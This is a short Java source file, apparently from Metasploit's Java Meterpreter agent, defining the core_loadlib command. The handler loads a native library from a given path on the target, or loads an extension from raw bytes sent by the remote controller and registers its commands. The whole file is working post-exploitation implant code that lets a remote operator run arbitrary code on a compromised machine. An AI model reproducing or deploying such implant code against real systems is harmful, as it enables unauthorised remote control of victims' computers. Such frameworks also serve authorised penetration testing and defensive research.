package com.metasploit.meterpreter.core;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

public class core_loadlib implements Command {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        int flags = request.getIntValue(TLVType.TLV_TYPE_FLAGS);
        byte[] data = request.getRawValue(TLVType.TLV_TYPE_DATA, null);
        String libraryPath = request.getStringValue(TLVType.TLV_TYPE_LIBRARY_PATH, null);
        String targetPath = request.getStringValue(TLVType.TLV_TYPE_TARGET_PATH, null);

        if ((flags & TLVType.LOAD_LIBRARY_FLAG_LOCAL) != 0) {
            try {
                Runtime.getRuntime().load(targetPath);
            } catch (UnsatisfiedLinkError e) {
                return ERROR_FAILURE;
            }
            return ERROR_SUCCESS;
        }

        Integer[] commands = meterpreter.loadExtension(data);
        for (int i = 0; i < commands.length; i++) {
            response.addOverflow(TLVType.TLV_TYPE_UINT, commands[i]);
        }
        return ERROR_SUCCESS;
    }
}
